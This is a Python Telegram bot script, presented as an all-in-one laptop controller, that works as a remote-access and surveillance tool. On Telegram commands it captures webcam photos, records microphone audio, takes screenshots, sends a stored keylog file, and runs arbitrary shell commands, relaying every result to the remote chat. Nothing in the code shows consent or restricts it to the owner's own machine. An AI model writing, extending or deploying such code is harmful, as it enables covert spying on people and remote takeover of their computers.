import telebot
from pyautogui import screenshot
import pyaudio
import urllib
import wave
import cv2
import subprocess


TOKEN = ""   # Initialize Telegram-Bot Token
SHELL_DIR = r"absolute/path/to/shell/directory"   # Initialize Directory to execute shell commands
DIRECTORY = r"absolute/path/to/output/directory"  # Initialize Output Directory
USERNAME = ''  # Your Telegram Username


bot = telebot.TeleBot(TOKEN)
CHAT_ID = ""


PLAY_AUDIO_FILE = "audio.wav"
AUDIO_FILE = "output.wav"
WEBCAM_FILE = "image.png"
SCREENSHOT_FILE = "screenshot.png"
KEY_LOGS_FILE = "keylogs.txt"


def record_audio(file_name, duration):
    audio = pyaudio.PyAudio()

    format = pyaudio.paInt16
    channels = 1
    rate = 44100
    chunk = 1024

    stream = audio.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)

    frames = []
    for i in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wave_file = wave.open(file_name, 'wb')
    wave_file.setnchannels(channels)
    wave_file.setsampwidth(audio.get_sample_size(format))
    wave_file.setframerate(rate)
    wave_file.writeframes(b''.join(frames))
    wave_file.close()


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if (call.data == "/take_screenshot") and (call.message.chat.username == USERNAME):
        take_screenshot(call.message)
    elif (call.data == "/web_cam") and (call.message.chat.username == USERNAME):
        web_cam(call.message)
    elif (call.data == "/record_mic") and (call.message.chat.username == USERNAME):
        record_mic(call.message)
    elif (call.data == "/logs") and (call.message.chat.username == USERNAME):
        logs(call.message)
    elif (call.data == "/play_audio") and (call.message.chat.username == USERNAME):
        get_audio(call.message)
    elif (call.data == "/shell") and (call.message.chat.username == USERNAME):
        shell(call.message)
    elif (call.data == "/lockscreen") and (call.message.chat.username == USERNAME):
        run_command("Rundll32.exe user32.dll,LockWorkStation")

@bot.message_handler(commands=['start'])
def start_command(message):
    CHAT_ID = message.chat.id
    bot.send_message(message.chat.id, """Greetings Admin!😎\nWelcome to your all-in-one Telegram bot! 
Capture webcam shots, record audio, play music, execute shell commands, take screenshots, and receive key presses – all effortlessly controlled through Telegram. 
\n\nSimply type /help to unlock your laptop's full potential! 🎬🎶🔌""")
    
@bot.message_handler(commands=['help'])
def help_command(message):
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(telebot.types.InlineKeyboardButton(text="Capture Web-Cam 📸", callback_data="/web_cam" ),
                 telebot.types.InlineKeyboardButton(text="Record audio 🎙", callback_data="/record_mic" ))
    keyboard.add(telebot.types.InlineKeyboardButton(text="Key-Logs 📃", callback_data="/logs" ),
                 telebot.types.InlineKeyboardButton(text="Screen-Shot 💻", callback_data="/take_screenshot" ))
    keyboard.add(telebot.types.InlineKeyboardButton(text="Play audio 🔊", callback_data="/play_audio"),
                 telebot.types.InlineKeyboardButton(text="Shell 🕶", callback_data="/shell"))
    keyboard.add(telebot.types.InlineKeyboardButton(text="Lock-Screen 🔒", callback_data="/lockscreen"))
    bot.send_message(
        message.chat.id, """Try out these features✨"""   
        ,reply_markup=keyboard
    )

def web_cam(message):
    cam = cv2.VideoCapture(0)

    result, image = cam.read()

    if result:
        save_location = f"{DIRECTORY}/{WEBCAM_FILE}"
        cv2.imwrite(save_location, image)
        print(f"Image saved at {save_location}")

    cam.release()
    with open(save_location, 'rb') as f:
        bot.send_photo(message.chat.id, photo=f)
    

def record_mic(message):
    bot.send_message(message.chat.id, "Audio file is being recorded and will be sent to you after 10 seconds...")
    record_audio(f"{DIRECTORY}/{AUDIO_FILE}",10)
    with open(f"{DIRECTORY}/{AUDIO_FILE}", 'rb') as f:
        bot.send_audio(message.chat.id, audio=f)

def take_screenshot(message):
    bot.send_message(message.chat.id, "📸Wait a sec...")
    ss = screenshot()
    ss.save(f'{DIRECTORY}/{SCREENSHOT_FILE}')
    
    with open(f'{DIRECTORY}/{SCREENSHOT_FILE}', 'rb') as f:
        bot.send_photo(message.chat.id, photo=f)
    
def logs(message):
    file = open(f"{DIRECTORY}/{KEY_LOGS_FILE}",'rb')
    bot.send_document(message.chat.id, file)
    
    
def get_audio(message):
    msg = bot.reply_to(message, "Hello! Send me an audio file.\n\nSupported file format: .wav, .mp3")
    bot.register_next_step_handler(msg, play_audio)

def play_audio(message):
    bot.send_message(message.chat.id,"Playing Audio...")
    file = bot.get_file(message.document.file_id)
    file_path = file.file_path
    file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
    file_name = f"{DIRECTORY}/{PLAY_AUDIO_FILE}"
    urllib.request.urlretrieve(file_url, file_name)

    audio = pyaudio.PyAudio()
    wf = wave.open(f"{DIRECTORY}/{PLAY_AUDIO_FILE}", "rb")
    stream = audio.open(format=pyaudio.paInt16, channels=wf.getnchannels(), rate=wf.getframerate(), output=True)
    data = wf.readframes(1024)
    while data:
        stream.write(data)
        data = wf.readframes(1024)
    stream.stop_stream()
    stream.close()
    audio.terminate()

    bot.send_message(message.chat.id, "Audio file played successfully!")


def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, cwd=SHELL_DIR)
    output, error = process.communicate()
    if error:
        return 'Error: ' + error.decode('utf-8')
    else:
        return output.decode('utf-8')

def shell(message):
    msg = bot.send_message(message.chat.id, "👩‍💻Enter a system command!")
    bot.register_next_step_handler(msg, shell_run)

def shell_run(message):
    cmd = message.text
    output = run_command(command=cmd)
    bot.reply_to(message,output)




bot.infinity_polling()
